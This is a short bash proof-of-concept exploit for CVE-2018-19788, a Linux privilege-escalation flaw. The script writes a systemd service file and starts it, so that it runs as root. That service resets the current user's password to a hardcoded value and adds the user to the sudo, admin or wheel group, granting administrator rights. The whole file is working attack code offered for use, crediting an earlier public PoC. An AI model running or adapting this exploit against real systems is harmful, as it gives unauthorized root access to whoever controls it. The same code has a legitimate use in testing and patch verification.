#!/bin/bash
set -e

command_exists() {
    command -v "$@" > /dev/null 2>&1
}

# PoC for CVE-2018-19788
prepare() {
    privileged_group=$([ -f /etc/lsb-release ] && echo "sudo" \
        || [ -f /etc/debian_version ] && echo "admin" \
        || echo "wheel")

	cat >woot.service<<EOF
	[Unit]
	Description=Woot
	[Service]
	Type=notify
	ExecStart=/bin/bash -c "echo \$(id)|tee $(pwd)/CVE-2018-19788 && echo h3lL0_-w0r7D | passwd $(whoami) --stdin && /bin/gpasswd --add $(whoami) $privileged_group"
	KillMode=process
	Restart=on-failure
	RestartSec=42s
	[Install]
	WantedBy=multi-user.target
EOF
}

exploit() {

    prepare

    if command_exists systemctl; then
    (
        set -x
        systemctl link $PWD/woot.service
        systemctl start woot
    ) || true
    fi
}

exploit

# Inspired by @mirchr
# https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
